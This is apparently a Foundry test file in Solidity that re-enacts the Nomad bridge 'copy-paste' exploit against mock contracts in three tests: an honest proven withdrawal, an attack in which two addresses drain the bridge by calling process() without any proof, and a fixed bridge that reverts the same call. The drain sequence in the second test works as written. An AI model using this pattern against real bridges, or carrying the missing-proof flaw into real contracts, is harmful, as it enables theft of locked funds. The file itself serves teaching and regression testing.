// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../src/MockToken.sol";
import {NomadBridge} from "../src/NomadBridge.sol";
import {NomadBridgeFixed} from "../src/NomadBridgeFixed.sol";

/// The Nomad "copy-paste" hack, rebuilt in three acts.
///   Act 1 — HONEST: a properly proven withdrawal pays out. The bridge works.
///   Act 2 — ATTACK: an UNPROVEN message drains the bridge, then a second person
///           copies the exact call with their own address — the democratized hack.
///   Act 3 — FIX: the one-line guard makes the same unproven message revert.
contract NomadTest is Test {
    MockToken token;
    address operator = address(this);
    address alice = makeAddr("alice");   // an honest user
    address eve   = makeAddr("eve");     // the first attacker
    address bob   = makeAddr("bob");     // a copycat who joined in

    uint256 constant POOL = 1_000_000e18; // the bridge's locked funds

    function setUp() public {
        token = new MockToken("Bridged USD", "bUSD");
    }

    function _fund(address bridge) internal {
        token.mint(bridge, POOL);
    }

    function _mUSD(uint256 wei_) internal pure returns (uint256) { return wei_ / 1e18; }

    // -------------------------------------------------------------------------
    function test_Act1_HonestWithdrawal() public {
        NomadBridge bridge = new NomadBridge(token);
        _fund(address(bridge));
        uint256 amount = 100_000e18;

        // A real cross-chain message for alice. Single-leaf tree, so root == leaf.
        bytes32 leaf = bridge.messageHash(alice, amount);
        bytes32 root = leaf;
        bytes32[] memory proof = new bytes32[](0);

        // Operator confirms the real root, then alice's message is proven + processed.
        bridge.confirmRoot(root);
        bridge.prove(alice, amount, root, proof);
        bridge.process(alice, amount);

        console2.log("ACT 1 - HONEST withdrawal (proven message)");
        console2.log("  alice received (bUSD):", _mUSD(token.balanceOf(alice)));
        console2.log("  pool remaining (bUSD):", _mUSD(token.balanceOf(address(bridge))));
        assertEq(token.balanceOf(alice), amount);
        assertEq(token.balanceOf(address(bridge)), POOL - amount);
    }

    // -------------------------------------------------------------------------
    function test_Act2_ReplayDrain() public {
        NomadBridge bridge = new NomadBridge(token);
        _fund(address(bridge));

        console2.log("ACT 2 - ATTACK (no proof at all)");
        console2.log("  pool before (bUSD):     ", _mUSD(token.balanceOf(address(bridge))));

        // Eve NEVER proves anything. She just calls process() with herself as the
        // recipient. provenRoot[leaf] == 0, and acceptableRoot(0) == true. Paid.
        vm.prank(eve);
        bridge.process(eve, 600_000e18);
        console2.log("  eve drained WITHOUT a proof (bUSD):", _mUSD(token.balanceOf(eve)));

        // Bob copies the exact same call and just swaps in his own address.
        // Different leaf, so the "already processed" guard doesn't stop him.
        vm.prank(bob);
        bridge.process(bob, 400_000e18);
        console2.log("  bob COPIED the attack, new address (bUSD):", _mUSD(token.balanceOf(bob)));
        console2.log("  pool after (bUSD):      ", _mUSD(token.balanceOf(address(bridge))));

        assertEq(token.balanceOf(eve), 600_000e18);
        assertEq(token.balanceOf(bob), 400_000e18);
        assertEq(token.balanceOf(address(bridge)), 0); // fully drained
    }

    // -------------------------------------------------------------------------
    function test_Act3_FixReverts() public {
        NomadBridgeFixed bridge = new NomadBridgeFixed(token);
        _fund(address(bridge));

        // The identical attack now hits the one-line guard and reverts.
        vm.prank(eve);
        vm.expectRevert(bytes("not proven"));
        bridge.process(eve, 600_000e18);
        console2.log("ACT 3 - FIX: the unproven drain reverts ('not proven')");

        // ...and an honest, proven withdrawal still works on the fixed bridge.
        uint256 amount = 100_000e18;
        bytes32 root = bridge.messageHash(alice, amount);
        bytes32[] memory proof = new bytes32[](0);
        bridge.confirmRoot(root);
        bridge.prove(alice, amount, root, proof);
        bridge.process(alice, amount);
        console2.log("  honest withdrawal still works, alice (bUSD):", _mUSD(token.balanceOf(alice)));

        assertEq(token.balanceOf(eve), 0);
        assertEq(token.balanceOf(alice), amount);
        assertEq(token.balanceOf(address(bridge)), POOL - amount);
    }
}
